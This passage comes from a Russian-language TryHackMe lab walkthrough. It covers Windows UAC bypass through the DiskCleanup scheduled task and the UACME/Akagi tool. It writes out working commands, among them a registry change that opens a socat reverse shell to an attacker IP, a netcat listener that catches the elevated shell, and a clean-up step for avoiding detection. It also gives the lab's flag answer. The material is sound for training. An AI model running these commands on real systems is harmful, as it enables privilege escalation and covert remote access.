C:\> reg add "HKCU\Environment" /v "windir" /d "cmd.exe /c C:\tools\socat\socat.exe TCP:<attacker_ip>:4446 EXEC:cmd.exe,pipes &REM " /f

C:\> schtasks /run  /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I
```

В результате вы должны получить оболочку с высоким IL:

Машина атакующего
```commandline
user@kali$ nc -lvp 4446      
Listening on 0.0.0.0 4446
Connection received on 10.10.183.127 25631
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami /groups | find "Label"
Mandatory Label\High Mandatory Level                          Label            S-1-16-12288
```

Чтобы получить флаг DiskCleanup, используйте новую оболочку для выполнения:

Администратор: Командная строка
`C:\flags\GetFlag-diskcleanup.exe`
Примечание: Имейте в виду, что флаг будет возвращен только в том случае, если вы успешно обошли UAC с помощью 
diskcleanup и только из получившейся высокоинтегрированной оболочки с помощью socat.

Расчищаем наши следы
В результате выполнения этого эксплойта в целевой системе были созданы некоторые артефакты, такие как ключи реестра. 
Чтобы избежать обнаружения, нам нужно убрать за собой с помощью следующей команды:

`reg delete "HKCU\Environment" /v "windir" /f`
Примечание: Обязательно выполните данную команду, чтобы избежать помех при выполнении следующих задач. Поскольку 
многие компоненты Windows полагаются на переменную среды %windir%, многое не будет работать должным образом, пока 
вы не удалите раздел реестра, используемый для этого обхода.

### Ответьте на вопросы ниже
Какой флаг возвращается при запуске эксплойта DiskCleanup?
```commandline
THM{SCHEDULED_TASKS_AND_ENVIRONMENT_VARS}
```

## Задание 7
Автоматизация обхода UAC
Доступен отличный инструмент для тестирования обходов UAC без написания собственных эксплойтов с нуля. Созданный 
@hfiref0x, UACME предоставляет актуальный репозиторий методов обхода UAC, которые можно использовать из коробки. 
Инструмент доступен для загрузки в официальном репозитории по адресу:

https://github.com/hfiref0x/UACME

Хотя UACME предоставляет несколько инструментов, мы сосредоточимся в основном на том, который называется Akagi, 
который запускает фактические обходы UAC. Вы можете найти скомпилированную версию Akagi под`C:\tools\UACME-Akagi64.exe`. 

Использование инструмента простое и требует только указания номера, соответствующего проверяемому методу. Полный 
список методов доступен в описании проекта на GitHub. Если вы хотите проверить метод 33, вы можете сделать следующее 
из командной строки, и появится cmd.exe высокой целостности:

Командная строка
```commandline
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\attacker>cd /tools

C:\tools>UACME-Akagi64.exe 33
```

Методы, представленные в этой комнате, также могут быть протестированы UACME с использованием следующих методов:

- 33	fodhelper.exe
- 34	Запланированная задача DiskCleanup
- 70	fodhelper.exe с использованием раздела реестра CurVer
### Ответьте на вопросы ниже
Нажмите и продолжайте обучение!

```commandline
Ответ не нужен
```

## Задание 8
В этой комнате мы показали несколько методов обхода UAC в системах Windows. Хотя большинство этих методов имеют автоматические инструменты, они будут легко обнаружены любым AV- решением на рынке, если будут использоваться сразу из коробки. Знание реальных методов даст вам преимущество как злоумышленнику, позволяя вам настраивать свои эксплойты по мере необходимости и делать их более уклончивыми.

Как мы увидели, UAC не считается границей безопасности и поэтому подвержен нескольким методам обхода.

Если вы заинтересованы в изучении дополнительных методов, доступны следующие ресурсы:

UACME github-репозиторий
Обход UAC с помощью поддельных папок и перехвата DLL
Стратегии обнаружения методов обхода UAC 
Читайте свой путь в UAC
Ответьте на вопросы ниже
Нажмите и продолжайте обучение!
```commandline
Ответ не нужен
```
[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)